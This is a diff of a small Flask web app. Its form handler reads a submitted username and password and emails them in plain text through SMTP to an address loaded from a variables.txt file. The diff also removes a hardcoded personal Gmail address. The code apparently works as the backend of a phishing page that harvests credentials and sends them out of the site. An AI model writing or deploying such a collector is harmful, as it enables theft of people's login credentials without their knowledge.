@@ -3,35 +3,46 @@ import smtplib
 
 logic = Flask(__name__)
 
-#Hardcoded email YOUR EMAIL HERE
-email = "your_email@eg.com"
+#Read the variables in variables.txt and store them in a list
+file_obj = open('variables.txt', 'r')
+index = 0
+SMTPInformation = list()
 
+for line in file_obj:
+    SMTPInformation.append((line.split(':'))[1].strip())
+
+#Assign the variables names for concise access
+senderEmail = SMTPInformation[0]
+senderPassword = SMTPInformation[1]
+senderServer = SMTPInformation[2]
+senderPort = SMTPInformation[3]
+
+#Index page for debugging (Not sure how implement that functionality)
 @logic.route('/index')
 def index():
 	return render_template("index.html")
 
+#Form page that includes the functionality as well as a reference to the HTML template
 @logic.route('/form_page', methods=['POST', 'GET'])
 def formPage():
 	if request.method == 'POST':
-
-		#Handle the post request
+		#Get the variables from the POST request
 		username = request.form['username']
 		password = request.form['password']
 
+		#The method that sets up the SMTP connection and sends the credentials.
 		def sendCredentials(user, password):
-			message = 'From: Form Submission <'+email+'>\nTo: Form Reception <'+email+'>'+'\nSubject: Form Submission\n\n'+'Username = '+user+' Password = '+password
-			fromaddr = 'kylejamesbehiels@gmail.com'
-			toaddr  = 'kylejamesbehiels@gmail.com'
-			username = 'kylejamesbehiels@gmail.com'
-			pword = 'blank'
-			server = smtplib.SMTP('smtp.gmail.com:587')
+			#Set message to a formatted String that includes the email header and content
+			message = 'From: Form Submission <'+senderEmail+'>\nTo: Form Reception <'+senderEmail+'>'+'\nSubject: Form Submission\n\n'+'Username = '+user+' Password = '+password
+			#Open the connection and send the credentials
+			server = smtplib.SMTP(senderServer+':'+senderPort)
 			server.ehlo
 			server.starttls()
-			server.login(username,pword)
-			server.sendmail(fromaddr, toaddr, message)
-			server.quit()
+			server.login(senderEmail,senderPassword)
+			server.sendmail(senderEmail, senderEmail, message)
+			server.quit() #Close the connection
 
-		sendCredentials(username, password)
+		sendCredentials(username, password) 
 		return render_template("simple_form.html")
 
 	else:
